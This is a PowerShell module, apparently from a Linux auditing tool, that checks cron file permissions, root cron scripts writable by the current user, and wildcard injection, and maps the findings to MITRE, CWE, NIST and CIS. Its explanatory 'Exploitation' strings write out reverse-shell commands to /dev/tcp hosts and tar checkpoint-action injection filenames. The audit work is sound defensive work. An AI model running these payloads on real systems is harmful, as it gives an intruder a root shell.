# ================================================================
# Mappings : MitreAttack / CWE / NIST / CIS
# ================================================================
$script:Mappings = [pscustomobject]@{
    MitreAttack = @(
        [pscustomobject]@{ Id = "T1053.003"; Name = "Scheduled Task/Job: Cron"; Tactic = "Persistence";          Url = "https://attack.mitre.org/techniques/T1053/003/" }
        [pscustomobject]@{ Id = "T1574";     Name = "Hijack Execution Flow";   Tactic = "Privilege Escalation"; Url = "https://attack.mitre.org/techniques/T1574/" }
        [pscustomobject]@{ Id = "T1222.002"; Name = "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification"; Tactic = "Defense Evasion"; Url = "https://attack.mitre.org/techniques/T1222/002/" }
    )
    CWE = @(
        [pscustomobject]@{ Id = "CWE-732"; Name = "Incorrect Permission Assignment for Critical Resource"; Url = "https://cwe.mitre.org/data/definitions/732.html" }
        [pscustomobject]@{ Id = "CWE-78";  Name = "OS Command Injection";                                  Url = "https://cwe.mitre.org/data/definitions/78.html" }
    )
    Nist = @(
        [pscustomobject]@{ Id = "AC-3";  Name = "Access Enforcement";  Url = "https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final" }
        [pscustomobject]@{ Id = "CM-6";  Name = "Configuration Settings"; Url = "https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final" }
        [pscustomobject]@{ Id = "AU-12"; Name = "Audit Record Generation"; Url = "https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final" }
    )
    CIS = @(
        [pscustomobject]@{ Id = "5.1.2"; Name = "Ensure permissions on /etc/crontab are configured";        Url = "https://www.cisecurity.org/benchmark/ubuntu_linux"; Version = "2.0.0"; BenchmarkId = "CIS Ubuntu Linux 22.04 LTS"; Description = "/etc/crontab should be owned by root and not group/world writable." }
        [pscustomobject]@{ Id = "5.1.3"; Name = "Ensure permissions on /etc/cron.hourly are configured";   Url = "https://www.cisecurity.org/benchmark/ubuntu_linux"; Version = "2.0.0"; BenchmarkId = "CIS Ubuntu Linux 22.04 LTS"; Description = "Cron directories should be owned by root with permissions 700." }
        [pscustomobject]@{ Id = "5.1.4"; Name = "Ensure permissions on /etc/cron.daily are configured";    Url = "https://www.cisecurity.org/benchmark/ubuntu_linux"; Version = "2.0.0"; BenchmarkId = "CIS Ubuntu Linux 22.04 LTS"; Description = "" }
        [pscustomobject]@{ Id = "5.1.8"; Name = "Ensure cron is restricted to authorised users";           Url = "https://www.cisecurity.org/benchmark/ubuntu_linux"; Version = "2.0.0"; BenchmarkId = "CIS Ubuntu Linux 22.04 LTS"; Description = "" }
    )
}

function fncGetMappings_LINUX_CRON_AUDIT { return $script:Mappings }

# ----------------------------------------------------------------
# Internal: check ownership and world-writability of a single path
# ----------------------------------------------------------------
function fncCronCheckPath {
    param(
        [string]$Path,
        [string]$TestId,
        [bool]$IsDir = $false
    )

    if (-not (Test-Path $Path)) { return }

    try {
        $raw = (& bash -c "stat -c '%a %U' '$Path' 2>/dev/null").Trim()
        if (-not ($raw -match '^(\d+)\s+(\S+)$')) { return }

        $mode  = $matches[1]
        $owner = $matches[2]

        $digits     = $mode.PadLeft(4, '0').ToCharArray()
        $worldDigit = [int][string]$digits[3]
        $worldWrite = ($worldDigit -band 2) -gt 0

        if ($owner -ne "root") {
            fncSubmitFinding `
                -Id ("CRON-" + (fncShortHashTag ("NONROOT_" + $Path))) `
                -Title ("Cron Path Not Owned by Root: {0}" -f $Path) `
                -Category "Persistence Detection" `
                -Severity "High" `
                -Status "Detected" `
                -Message ("$Path is owned by '$owner' rather than root. Non-root ownership allows injection or modification of scheduled tasks.") `
                -Recommendation ("sudo chown root:root '$Path'" ) `
                -Evidence @(("$Path owner=$owner mode=$mode")) `
                -SourceTests @($TestId) `
                -Remediation ("sudo chown root:root '$Path'`nsudo chmod 600 '$Path'")
        }

        if ($worldWrite) {
            fncSubmitFinding `
                -Id ("CRON-" + (fncShortHashTag ("WORLDWRITE_" + $Path))) `
                -Title ("Cron Path is World-Writable: {0}" -f $Path) `
                -Category "Persistence Detection" `
                -Severity "Critical" `
                -Status "Detected" `
                -Message ("$Path has world-write permission (mode $mode). Any local user can inject or replace cron jobs that execute as root.") `
                -Recommendation ("sudo chmod o-w '$Path'") `
                -Evidence @(("$Path mode=$mode")) `
                -SourceTests @($TestId) `
                -Exploitation "A local user can append 'bash -i >& /dev/tcp/attacker/4444 0>&1' or a SUID shell copy to a world-writable cron script and receive a root shell at the next scheduled execution." `
                -Remediation ("sudo chmod 600 '$Path'")
        }
    }
    catch {}
}

# ================================================================
# Function: fncCheckLinuxCronSecurity
# ================================================================
function fncCheckLinuxCronSecurity {

    fncSafeSectionHeader "Cron Job Security Assessment"

    if (-not $IsLinux) {
        fncTestMessage "This test requires a Linux host. Skipping." "warning"
        return
    }

    $Risk       = "Safe"
    $RiskReason = "Read-only cron file and permission enumeration - no cron modifications performed"
    fncPrintRisk $Risk $RiskReason

    fncTestMessage "Auditing cron configuration and scheduled job security..." "info"
    Write-Host ""

    $testId = "LINUX-CRON-AUDIT"

    # ----------------------------------------------------------------
    # /etc/crontab
    # ----------------------------------------------------------------
    fncTestMessage "Checking /etc/crontab..." "info"
    fncCronCheckPath "/etc/crontab" $testId

    # ----------------------------------------------------------------
    # Cron directories and their contents
    # ----------------------------------------------------------------
    $cronDirs = @("/etc/cron.d", "/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly")

    foreach ($dir in $cronDirs) {
        if (-not (Test-Path $dir)) { continue }

        fncTestMessage ("Checking {0}..." -f $dir) "info"
        fncCronCheckPath $dir $testId -IsDir $true

        try {
            Get-ChildItem $dir -File -ErrorAction SilentlyContinue | ForEach-Object {
                fncCronCheckPath $_.FullName $testId
            }
        }
        catch {}
    }

    Write-Host ""

    # ----------------------------------------------------------------
    # Collect root cron commands from system crontab files
    # ----------------------------------------------------------------
    fncTestMessage "Collecting root cron job commands..." "info"

    $rootCronCommands = [System.Collections.Generic.List[string]]::new()

    try {
        if (Test-Path "/etc/crontab") {
            Get-Content "/etc/crontab" -ErrorAction SilentlyContinue |
                Where-Object { $_ -notmatch '^\s*#' -and $_ -notmatch '^\s*$' -and $_ -match '\sroot\s' } |
                ForEach-Object {
                    $parts = ($_ -split '\s+', 7)
                    if ($parts.Count -ge 7) { $rootCronCommands.Add($parts[6]) }
                }
        }
    }
    catch {}

    try {
        if (Test-Path "/etc/cron.d") {
            Get-ChildItem "/etc/cron.d" -File -ErrorAction SilentlyContinue | ForEach-Object {
                Get-Content $_.FullName -ErrorAction SilentlyContinue |
                    Where-Object { $_ -notmatch '^\s*#' -and $_ -notmatch '^\s*$' -and $_ -match '\sroot\s' } |
                    ForEach-Object {
                        $parts = ($_ -split '\s+', 7)
                        if ($parts.Count -ge 7) { $rootCronCommands.Add($parts[6]) }
                    }
            }
        }
    }
    catch {}

    fncTestMessage ("Collected {0} root cron command(s) to analyse." -f $rootCronCommands.Count) "info"
    Write-Host ""

    # ----------------------------------------------------------------
    # Check if scripts called by root cron are writable by current user
    # ----------------------------------------------------------------
    fncTestMessage "Checking root cron scripts for writable paths..." "info"

    $writableScripts = [System.Collections.Generic.List[string]]::new()

    foreach ($cmd in $rootCronCommands) {
        $firstToken = ($cmd.Trim() -split '\s+')[0]
        if ($firstToken -like "/*") {
            try {
                $writable = (& bash -c "test -w '$firstToken' 2>/dev/null && echo writable").Trim()
                if ($writable -eq "writable") {
                    $writableScripts.Add(("{0}  (called by root cron)" -f $firstToken))
                }
            }
            catch {}
        }
    }

    if ($writableScripts.Count -gt 0) {
        fncSubmitFinding `
            -Id ("CRON-" + (fncShortHashTag "WRITABLE_CRON_SCRIPTS")) `
            -Title "Root Cron Jobs Reference Writable Scripts" `
            -Category "Persistence Detection" `
            -Severity "Critical" `
            -Status "Detected" `
            -Message ("$($writableScripts.Count) script(s) called by root cron jobs are writable by the current user. Writing a payload to these scripts will execute as root at the next cron interval.") `
            -Recommendation "Fix ownership and permissions on all scripts called by root cron jobs." `
            -Evidence $writableScripts.ToArray() `
            -SourceTests @($testId) `
            -Exploitation "Append payload to the writable script: echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /path/to/script`nThe cron daemon will execute it as root at the next interval with no further privileges required." `
            -Remediation "For each writable script:`n    sudo chown root:root /path/to/script`n    sudo chmod 750 /path/to/script"
    }
    else {
        fncTestMessage "No writable root cron scripts detected [OK]" "proten"
    }

    Write-Host ""

    # ----------------------------------------------------------------
    # Wildcard injection check (tar, rsync, find, chown, chmod with *)
    # ----------------------------------------------------------------
    fncTestMessage "Checking for wildcard injection patterns in root cron commands..." "info"

    $wildcardCmds    = @("tar ", "rsync ", "find ", "chown ", "chmod ")
    $wildcardFindings = [System.Collections.Generic.List[string]]::new()

    foreach ($cmd in $rootCronCommands) {
        $hasWild = $cmd -like "* * *" -or $cmd -like "*/*"
        if (-not $hasWild) { $hasWild = $cmd.Contains("*") }
        if ($hasWild) {
            foreach ($pat in $wildcardCmds) {
                if ($cmd -like "*$pat*") {
                    $wildcardFindings.Add($cmd.Trim())
                    break
                }
            }
        }
    }

    if ($wildcardFindings.Count -gt 0) {
        fncSubmitFinding `
            -Id ("CRON-" + (fncShortHashTag "WILDCARD_INJECTION")) `
            -Title "Potential Wildcard Injection in Root Cron Commands" `
            -Category "Persistence Detection" `
            -Severity "Medium" `
            -Status "Detected" `
            -Message ("$($wildcardFindings.Count) root cron command(s) use wildcards with tools susceptible to argument injection. If a user controls files in the target directory they may inject arbitrary arguments.") `
            -Recommendation "Replace wildcards with explicit paths, or use -- to terminate option processing before the wildcard." `
            -Evidence $wildcardFindings.ToArray() `
            -SourceTests @($testId) `
            -Exploitation "For tar wildcards: create files named '--checkpoint=1' and '--checkpoint-action=exec=sh payload.sh' in the working directory. When tar expands the wildcard it executes the payload as root." `
            -Remediation "Replace: tar czf backup.tgz *`nWith:    tar czf backup.tgz /explicit/path/`nOr:      tar czf backup.tgz -- *"
    }
    else {
        fncTestMessage "No wildcard injection patterns detected in root cron commands [OK]" "proten"
    }

    Write-Host ""
    fncTestMessage "Cron security assessment complete." "info"
}

Export-ModuleMember -Function @("fncCheckLinuxCronSecurity", "fncGetMappings_LINUX_CRON_AUDIT")
